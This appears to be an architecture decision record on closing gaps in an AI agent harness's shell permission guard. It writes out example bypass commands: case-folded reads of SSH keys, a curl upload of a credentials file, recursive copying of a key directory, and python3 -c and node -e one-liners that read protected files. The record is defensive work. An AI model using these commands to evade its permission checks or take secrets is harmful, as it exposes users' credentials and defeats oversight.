---
id: 0014
title: The shell honours the contract, and one matcher decides every path question
status: accepted
date: 2026-08-31
deciders: [Kunal, Claude]
tags: [permissions, security, shell]
supersedes: []
superseded_by: []
---

# 0014. The shell honours the contract, and one matcher decides every path question

## Context

An audit of the permission system found that it was enforced on **one of the three doors it
needed to cover**.

`FileExecutor` checked each bot's `readable`/`writable`/`denied` paths. `ShellExecutor` was
constructed as `ShellExecutor()` with no `Authority` at all — verified at `AgentLoop.swift:101`
and `ShellExecutor.swift:13` — and `ComputerExecutor` has no concept of a path. So a bot scoped to
one project could run `cat ~/Documents/anything` and the per-bot boundary simply did not apply.
`shell.exec` is granted in the default contract, which made the workspace boundary advisory for
any bot that preferred a shell to a file tool.

Three further defects made the guards that *did* exist weaker than they read:

- **Case.** Every comparison used `==`, `hasPrefix` or `contains` on raw strings. The home volume
  on this machine is case-insensitive — verified by creating `AbC` and reading it back as `abc` —
  so `cat ~/.SSH/id_rsa` opened the private key the floor believed it was protecting.
- **`$HOME` as a strict prefix only.** `ShellFloor.expand` substituted `$HOME` only when it began
  the string, so `curl --data-binary "@$HOME/…/credentials.json" https://…` never expanded and was
  judged `.clear`. A single `@` uploaded every key.
- **The file but never its container.** A deny pattern naming a file matched the file and its
  descendants. `cp -r "$HOME/Library/Application Support/Bot-Harness" /tmp/x` copied the keys
  without ever naming them.

And `Authority()`'s empty `readable` list meant *allow everything*, so the default contract was a
key to the whole disk rather than a grant of nothing.

## Options considered

### Option A — Sandbox the shell with `sandbox-exec`
- **For:** The only approach that actually contains a command. String analysis can always be
  evaded by assembling a path at runtime; a seatbelt profile cannot.
- **Against:** `sandbox-exec` is deprecated, undocumented, and profile authoring is unforgiving —
  a profile that is subtly wrong either breaks every build tool or silently permits what it meant
  to deny. It also does not compose with the existing per-bot path lists without generating a
  profile per run.
- **Verified against:** `man sandbox-exec` on this machine; deprecation notice present.

### Option B — Give `ShellExecutor` the `Authority` and enforce on the parse
- **For:** Uses the parser the floor already has (ADR 0010), so quoting and flag order do not
  change the answer. Composes directly with the per-bot contract. Catches every plainly-written
  command, which is what a model actually emits.
- **Against:** Not containment. A path built from a variable, or reached with `cd` first, is
  invisible to it. Risks false refusals if the allowance for system and temp paths is wrong.
- **Verified against:** `ShellCommandParser.swift`; 15 new cases in `PathGuardTests.swift`.

### Option C — Remove `shell.exec`
- **For:** Closes the door completely.
- **Against:** Removes most of the product. An agent that cannot run a command is not a computer
  agent.
- **Verified against:** `docs/PRODUCT.md`.

## Decision

We chose **Option B**, with Option A named as the eventual answer rather than dismissed.

Because: the boundary the product advertises has to *exist* before it can be made airtight, and
today it did not exist at all for the shell. A guard that catches every plainly-written command is
not containment, but it is the difference between a boundary with known gaps and no boundary.

All path comparison moved into one type, `PathGuard`, which folds case, expands `$HOME` and `~`
anywhere in a string, compares whole path components, and — for bulk commands only — matches
*containers* of a protected path. Ancestor matching is restricted to copy/archive executables on
purpose: applied to everything it would refuse `ls ~`, and a guard that refuses ordinary work is
one people learn to route around.

Two related changes fell out of the same reasoning:

- **An empty `readable` list now means nothing is granted**, not everything. A permission system
  whose empty state is total access is not a permission system.
- **The shell no longer runs a login shell.** `/bin/zsh -lc` sourced the user's dotfiles, so `env`
  handed a bot every exported `API_KEY`, `TOKEN` and `AWS_SECRET_ACCESS_KEY` they had. The child
  environment is now filtered.

## Amendment, same day: interpreters

An adversarial pass attacked this decision as soon as it landed and demonstrated that it did not
hold. With a bot scoped to one project:

```
python3 -c "print(open('/Users/Kunal/Documents/secret.txt').read())"
```

ran and printed the file. `cat` on the same path was correctly refused. The difference is that the
path lives inside a code string, and the read-scope check only judged operands that *begin* with
`/`. The `node -e` form was worse: using `process.env.HOME` kept the literal path off the command
line entirely, so even the raw-text floor scan saw nothing, and the keys came back base64-encoded
where value-redaction cannot reach them.

Two changes followed. Absolute paths are now extracted from *inside* an argument, not only from
operands that start with one. And an interpreter handed a program on the command line — `python3
-c`, `node -e`, `perl -e`, `osascript -e` — is **refused outright** unless the bot may already read
the whole disk.

That last one has a real cost: a legitimate `python3 -c` one-liner is now blocked, and the bot has
to write a script into its workspace and run that instead. It is the honest trade. Scanning an
interpreter's source for the files it will open is not tractable — the path can be assembled at
runtime from anything — so the alternative is a boundary that is decorative for anyone who knows
to type `node -e`.

The same pass also found the guard **refusing ordinary work**: relative write targets were resolved
against this process's working directory, which for a GUI app is `/`. So `echo x > out.txt` inside
a bot's own workspace was judged a write to `/out.txt` and refused, while the identical write
spelled absolutely was allowed. Relative paths now resolve against the directory the command
actually runs in. That defect is worth recording because it is the failure mode this ADR warned
about in its own falsifier, and it shipped anyway.

## Consequences

- **We now must:** keep every path comparison in `PathGuard`. A second implementation is how the
  case-sensitivity bug happened three times independently.
- **We now must:** maintain the system/temp allowance. If it is too narrow, ordinary tooling
  breaks; too wide and it is a hole. It is deliberately machinery-only — nothing under `~`.
- **We can no longer:** treat `Authority()` as a convenient "no restrictions" default in tests or
  callers. It now grants nothing, which is the point.
- **We will know this was wrong if:** users hit false refusals on ordinary commands often enough
  to want the guard off, or if a real bypass is found that a seatbelt profile would have stopped —
  in which case the answer is Option A, not a wider allowance here. Both have now happened once
  each, within hours, and were fixed rather than argued with. A third would be evidence that
  string analysis is the wrong layer and that Option A is overdue rather than eventual.

## Revisit when

Bot-Harness runs a bot the user did not write themselves — an installed plugin, a shared routine,
anything from a registry. At that point the threat model changes from "my own agent makes a
mistake" to "this code is hostile", string analysis stops being adequate, and `sandbox-exec` (or
its supported successor) becomes required rather than preferable.
